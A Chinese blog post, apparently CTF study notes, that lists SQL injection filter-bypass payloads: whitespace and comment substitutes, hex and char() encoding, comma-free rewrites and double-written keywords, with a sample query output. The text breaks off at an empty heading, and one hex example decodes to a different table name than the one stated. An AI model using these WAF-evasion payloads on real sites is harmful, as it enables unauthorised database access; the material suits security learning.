---
layout:     post                    # 使用的布局（不需要改）
title:      SQL注入绕过与sqlmap使用方法总结               # 标题 
subtitle:   Challenges #副标题
date:       2019-09-02              # 时间
author:     Von                      # 作者
header-img: img/post-bg-android.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - Web
    - SQL

---

# 前言
最近零零散散地吧sqli-labs刷完了，学到了很多知识。但在里面对于WAF过滤的情况研究得不多，仅起到一个入门的作用，而在CTF中是基本上不会有这么简单的注入的。在这里我写一篇文章对常见的绕过过滤方法进行总结。

# 过滤了#,-- 
这种过滤了注释符的我们可以用类似'1'='1来绕过，比如当闭合方式为'的情况下，我们在语句后面添加 and '1'='1来闭合后面的'，也同时达到了注释的作用。  

# 过滤了空格
1. %20 %09 %0d %0b %0c %0d %a0 %0a，这些字符不会被php的\s匹配。  
2. 使用括号来避免使用空格.
``` sql
mysql> select(username)from(security.users);
+----------+
| username |
+----------+
| Dumb     |
| Angelina |
| Dummy    |
| secure   |
| stupid   |
| superman |
| batman   |
| admin    |
| admin1   |
| admin2   |
| admin3   |
| dhakkan  |
| admin4   |
| test     |
+----------+
14 rows in set (0.00 sec)
```

# 过滤了'
1. hex编码:这里对应的主要情况主要是在where字句中:
``` sql
select column_name  from information_schema.tables where table_name='user'
```
当过滤了'时我们就没办法闭合了，这时我们可以使用16进制编码来绕过。也就是:
``` sql
select column_name  from information_schema.tables where table_name=0x7573657273
```
2. char编码:
``` sql
select column_name  from information_schema.tables where table_name=char(117,115,101,114)
```

# 过滤了,
我们主要在三种情况下会用到,  
1. limit语句
``` sql
limit 0,1 => limit 1 offset 0;
```
2. 盲注时的mid
``` sql
mid(str,i,j) => mid((str)from(i)for(j))
```
3. union语句
``` sql
union select 1,2,3 => union select * from (select 1)a join (select 2)b join (select 3)c;
```

# 过滤了and,or
可以用逻辑运算符&&,||来绕过，如果是被替换为''的话还可以使用双写绕过如:aandnd,oorr。
# 过滤了&,|,*,/,=等逻辑处理字符
## =
```
select * from users where id in(2);
```
## 
